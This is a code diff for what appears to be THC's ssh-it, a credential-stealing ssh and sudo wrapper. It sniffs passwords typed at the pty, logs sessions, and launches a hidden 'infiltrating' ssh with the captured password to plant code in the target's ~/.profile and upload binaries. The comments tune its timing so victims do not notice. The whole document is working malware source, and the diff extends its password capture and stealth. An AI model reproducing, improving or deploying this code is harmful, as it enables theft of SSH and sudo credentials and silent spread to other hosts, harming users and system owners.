@@ -37,10 +37,10 @@ static bool g_is_skip_line;
 
 // Timeout for infiltrating process
 // Wait 30 seconds at any prompt for real user input
-#define THC_TO_WAIT_AT_PROMPT_SEC           (30)
-// Give infiltrating process 2 seconds before starting real process [ssh]
+#define THC_TO_WAIT_AT_PROMPT_MSEC           (30 * 1000)
+// Give infiltrating process 1 second head-start before starting real process [ssh]
 // May expire early if infiltrating process detects password prompt or completes early
-#define THC_TO_WAIT_CONNECT_SEC             (2)
+#define THC_TO_WAIT_CONNECT_MSEC             (1 * 1000)
 // SSH takes 2-3 seconds to report a incorrect password. Waiting for infiltrator 2-3 seconds
 // and then another 2-3 seconds for the real ssh is noticaeble to the user.
 // Instead give infiltrating ssh a head-start of 1 second and send captured
@@ -48,13 +48,13 @@ static bool g_is_skip_line;
 // infiltrating ssh made good use of the headstart and will have finished its job
 // before user's ~/.profile is read.
 // Continue immediatley when THCPROFILE is received.
-#define THC_TO_WAIT_PASSWORD_AUTH           (1)
-// Give infiltrating process 2 seconds to complete (successfully or failure)
-#define THC_TO_WAIT_INF_COMPLETE            (2)
+#define THC_TO_WAIT_PASSWORD_AUTH_MSEC       (1 * 1000)
+// Give infiltrating process 1 second to complete profile infiltration (after THCINSIDE)
+#define THC_TO_WAIT_INF_COMPLETE_MSEC        (1 * 1000)
 // Give infiltrating process 15 seconds to complete its job (upload all binaries etc)
-#define THC_TO_WAIT_FINISH_SEC              (15)
+#define THC_TO_WAIT_FINISH_MSEC              (15 * 1000)
 // Give infiltrating process 2 more seconds even if real ssh has finished.
-#define THC_TO_WAIT_FINISH_AFTER_EXIT_SEC   (2)
+#define THC_TO_WAIT_FINISH_AFTER_EXIT_MSEC   (2 * 1000)
 static uint64_t g_i_expire;         // start + 2 seconds
 
 #define THC_BASEDIR           ".prng"
@@ -67,21 +67,25 @@ static uint64_t g_i_expire;         // start + 2 seconds
 #define THC_DB_TRY_SEC        (60 * 60 * 12)      // Wait at least 12h before trying again
 
 enum _stage_i_t {
-	THC_STAGE_I_NONE         = 0x00,
-	THC_STAGE_I_INSIDE       = 0x01, // Sucessfully logged in
-	THC_STAGE_I_PROFILE      = 0x02, // Target's ~/.profile infiltrated
-	THC_STAGE_I_FINISHED     = 0x03
+	THC_STAGE_I_NONE           = 0x00,
+	THC_STAGE_I_INSIDE         = 0x01, // Sucessfully logged in
+	THC_STAGE_I_PROFILE        = 0x02, // Target's ~/.profile infiltrated
+	THC_STAGE_I_FINISHED       = 0x03
 };
-
 enum _stage_i_t stage_i;
 
 enum _expire_action_t {
-	THC_EXP_ACTION_NONE       = 0x00,
-	THC_EXP_ACTION_UNPAUSE    = 0x01,
-	THC_EXP_ACTION_FINISH     = 0x02,
+	THC_EXP_ACTION_NONE        = 0x00,
+	THC_EXP_ACTION_UNPAUSE     = 0x01,
+	THC_EXP_ACTION_FINISH      = 0x02
 };
-
 enum _expire_action_t g_expire_action;
+
+enum _expire_state_t {
+	THC_EXP_STATE_NONE         = 0x00,
+	THC_EXP_STATE_WAIT_CONNECT = 0x01
+};
+enum _expire_state_t g_expire_state;
 
 // Environment Variables
 // THC_IS_SESSIONLOG    - Log ssh's stdin session to THC_DB_BASEDIR/s-<host>-<port>-<user>-<timestamp>.log
@@ -114,20 +118,19 @@ static void set_state_password_captured(char *pwd);
 static void pty_ssh_start(void);
 static int db_update(const char *dbname);
 
-
-
 static void
-timeout_update(int sec, enum _expire_action_t action)
+timeout_update(int msec, enum _expire_state_t state, enum _expire_action_t action)
 {
-	DEBUGF_B("Setting timeout to %d seconds, action=%d\n", sec, action);
+	DEBUGF_B("Setting timeout to %0.03f seconds, state=%d, action=%d\n", (float)msec / 1000, state, action);
 	g_expire_action = action;
-	if (sec == 0)
+	g_expire_state = state;
+	if (msec == 0)
 	{
 		g_i_expire = 0;
 		return;
 	}
 
-	g_i_expire = THC_usec() + THC_SEC_TO_USEC(sec);
+	g_i_expire = THC_usec() + THC_MSEC_TO_USEC(msec);
 }
 
 // Supporting two ways of redirecting to our pty-sniffing 'ssh'.
@@ -358,7 +361,6 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 static void
 nopty_exec(char *cmd[])
 {
-	DEBUGF("%p\n", cmd);
 	cmd[0] = g.target_name;
 	DEBUGF("nopty_exec(%s)\n", cmd[0]);
 	execvp(g.target_file, cmd);
@@ -437,7 +439,7 @@ match_stage_inside(const char *str)
 	LNBUF_free(&g.ln_pty);
 	LNBUF_free(&g.ln_in);
 
-	timeout_update(THC_TO_WAIT_INF_COMPLETE, THC_EXP_ACTION_FINISH);
+	timeout_update(THC_TO_WAIT_INF_COMPLETE_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
 
 	return true;
 }
@@ -453,7 +455,7 @@ match_stage_profile(const char *str)
 	if (ret == 0)
 		return;
 
-	timeout_update(THC_TO_WAIT_FINISH_SEC, THC_EXP_ACTION_FINISH);
+	timeout_update(THC_TO_WAIT_FINISH_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
 	DEBUGF("I: un-pausing PTY\n");
 	g_is_pty_pause = false;
 	IO_unpause(&io_ssh);
@@ -462,6 +464,7 @@ match_stage_profile(const char *str)
 }
 
 
+// Return FALSE if sniffing is not possible 
 static bool
 is_need_sniffing_ssh(int argc, char *argv[])
 {
@@ -698,7 +701,7 @@ log_open(int *fd_log, const char *prefix, const char *name)
 	else
 		snprintf(buf, sizeof buf, "%s/%s-%s.log", g.log_basedir, prefix, name);
 
-	*fd_log = open(buf, O_WRONLY | O_APPEND | O_CREAT, 0600);
+	*fd_log = open(buf, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0600);
 	if (*fd_log < 0)
 	{
 		DEBUGF_R("open(%s): %s\n", buf, strerror(errno));
@@ -708,9 +711,9 @@ log_open(int *fd_log, const char *prefix, const char *name)
 	}
 }
 
-// Return 'false' if root-ssh-it is already installed system-wide on the
-// destination host (e.g. root login or sudo was detected).
-// Return 'true' otherwise.
+
+// Return TRUE if this session needs pty-sniffing
+// and logging.
 static bool
 is_need_sniffing(int argc, char *argv[])
 {
@@ -718,17 +721,22 @@ is_need_sniffing(int argc, char *argv[])
 	bool is_sniffing_sudo = false;
 	char buf[1024];
 	char log_name[1024];
+	bool is_sessionlog = g.is_sessionlog;
 
 	if (strcmp(g.target_name, "ssh") == 0)
 	{
 		g_is_ssh = true;
 		is_sniffing_ssh = is_need_sniffing_ssh(argc, argv);
+		if (is_sniffing_ssh == false)
+			is_sessionlog = false;
 		snprintf(buf, sizeof buf, "%s@%s:%d", g.login_name, g.host, g.port);
 		g_host_id = strdup(buf);
 		snprintf(log_name, sizeof log_name, "ssh-%s-%llu", g_host_id, (unsigned long long)time(NULL));
 	} else if (strcmp(g.target_name, "sudo") == 0) {
 		g_is_sudo = true;
 		is_sniffing_sudo = is_need_sniffing_sudo(argc, argv);
+		if (is_sniffing_sudo == false)
+			is_sessionlog = false;
 		snprintf(buf, sizeof buf, "%s@localhost", g.login_name);
 		g_host_id = strdup(buf);
 		snprintf(log_name, sizeof log_name, "sudo-%s-%llu", g_host_id, (unsigned long long)time(NULL));
@@ -738,15 +746,12 @@ is_need_sniffing(int argc, char *argv[])
 		snprintf(log_name, sizeof log_name, "%s-%s-%llu", g.target_name, g.login_name, (unsigned long long)time(NULL));
 	}
 
-	if ((is_sniffing_ssh == false) && (is_sniffing_sudo == false) && (g.is_sessionlog == false))
-		return false; // Dont need sniffing or session log.
 
-	if (g.is_sessionlog)
+	if (is_sessionlog)
 	{
 		// Use single log file instead (if set)
 		if (g.sessionlog_file != NULL)
 		{
-
 			snprintf(buf, sizeof buf, "%s", g.sessionlog_file);
 			DEBUGF_C("Logging session to single logfile: %s\n", buf);
 			log_open(&g.fd_log, NULL, buf);
@@ -756,9 +761,16 @@ is_need_sniffing(int argc, char *argv[])
 			log_open(&g.fd_log, "session-output", log_name);
 			log_open(&g.fd_log_in, "session-input", log_name);
 		}
+
+		return true; // needs sniffing because session needs to be logged.
 	}
 
-	return true; // needs infiltration
+	if (g_is_ssh)
+		return is_sniffing_ssh;
+	if (g_is_sudo)
+		return is_sniffing_sudo;
+
+	return false;
 }
 
 static void
@@ -812,7 +824,7 @@ infiltrate_done(void)
 {
 	DEBUGF("%s (pty-pause=%d, pid_i=%d)\n", __func__, g_is_pty_pause, pid_i);
 
-	timeout_update(0, THC_EXP_ACTION_NONE);
+	timeout_update(0, THC_EXP_STATE_NONE, THC_EXP_ACTION_NONE);
 
 	if (pid_i > 0)
 	{
@@ -902,7 +914,7 @@ infiltrate_read(void)
 	if (strstr_password(str) == false)
 		return 0;
 
-	timeout_update(THC_TO_WAIT_AT_PROMPT_SEC, THC_EXP_ACTION_FINISH);
+	timeout_update(THC_TO_WAIT_AT_PROMPT_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
 	g_is_waiting_at_prompt_i = true;
 	g_is_prompt_waiting_newline_i = true;
 	// Wait for User to enter password. Then send password to infiltrating ssh
@@ -926,7 +938,13 @@ i_timeout(void)
 		IO_unpause(&io_ssh);
 		g_is_pty_pause = false;
 
-		timeout_update(0, THC_EXP_ACTION_NONE);
+		if (g_expire_state == THC_EXP_STATE_WAIT_CONNECT)
+		{
+			timeout_update(THC_TO_WAIT_FINISH_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
+			pty_ssh_start();
+		}
+		else
+			timeout_update(0, THC_EXP_STATE_NONE, THC_EXP_ACTION_NONE);
 
 		return;
 	}
@@ -1023,7 +1041,7 @@ io_loop(void)
 					DEBUGF_R("fd_i=%d\n", fd_i);
 					break;
 				}
-				timeout_update(THC_TO_WAIT_FINISH_AFTER_EXIT_SEC, THC_EXP_ACTION_FINISH);
+				timeout_update(THC_TO_WAIT_FINISH_AFTER_EXIT_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
 			}
 		}
 
@@ -1132,7 +1150,7 @@ infiltrate_ssh(void)
 
 	LNBUF_init(&lnb_i, 120, fd_i /*id*/, cb_lnbuf_infiltrate_ssh, NULL);
 
-	timeout_update(THC_TO_WAIT_CONNECT_SEC, THC_EXP_ACTION_FINISH);
+	timeout_update(THC_TO_WAIT_CONNECT_MSEC, THC_EXP_STATE_WAIT_CONNECT, THC_EXP_ACTION_UNPAUSE);
 }
 
 // Real ssh has logged in
@@ -1159,7 +1177,7 @@ set_state_password_captured(char *pwd)
 		// If this is the wrong password then ssh will take 2-3 seconds to reply with
 		// "Permission denied, please try again later". Wait for this or THCPROFILE
 		// g_is_pty_pause = false;  # Delay login until THCPROFILE is received
-		timeout_update(THC_TO_WAIT_PASSWORD_AUTH, THC_EXP_ACTION_UNPAUSE);
+		timeout_update(THC_TO_WAIT_PASSWORD_AUTH_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_UNPAUSE);
 		g_is_waiting_at_prompt_i = false;
 	} else {
 		g_is_pty_pause = true;
@@ -1204,8 +1222,8 @@ cb_lnbuf(void *lptr, void *arg_UNUSED)
 	if (l == &g.ln_in)
 	{
 		// HERE: input from USER (not from ssh)
-		if (fd_i < 0)
-			return; // infiltrater not running
+		// if (fd_i < 0)
+		// 	return; // infiltrater not running
 
 		char *password = ln_check_pwd(&g.ln_in, &g.ln_pty);
 		if (password != NULL)
@@ -1214,10 +1232,14 @@ cb_lnbuf(void *lptr, void *arg_UNUSED)
 			n_passwords += 1;
 			DEBUGF_W("PASSWORD CANDIDATE (%d/%d): '%s' (g_is_pty_pause=%s)\n", n_prompts, n_passwords, LNBUF_line(&g.ln_in), g_is_pty_pause?"true":"false");
 
-			// Pause real ssh until next password prompt, timeout or THCPROFILE
-			g_is_pty_pause = true;
-			g_is_skip_line = true;
-			IO_pause(&io_ssh);
+			if (fd_i >= 0)
+			{
+				// INFILTRATOR running...
+				// Pause real ssh until next password prompt, timeout or THCPROFILE
+				g_is_pty_pause = true;
+				g_is_skip_line = true;
+				IO_pause(&io_ssh);
+			}
 
 			set_state_password_captured(password);
 			DEBUGF_C("g_is_pty_pause=%s\n", g_is_pty_pause?"true":"false");
@@ -1439,8 +1461,8 @@ main(int argc, char *argv[])
 		nopty_exec(argv); // Does not return
 
 	// No destination host specified. ('ssh -h' for example...)
-	if (g.ssh_destination == NULL)
-		nopty_exec(argv);
+	// if (g.ssh_destination == NULL)f
+		// nopty_exec(argv);
 
 	if (is_need_infiltrate())
 	{
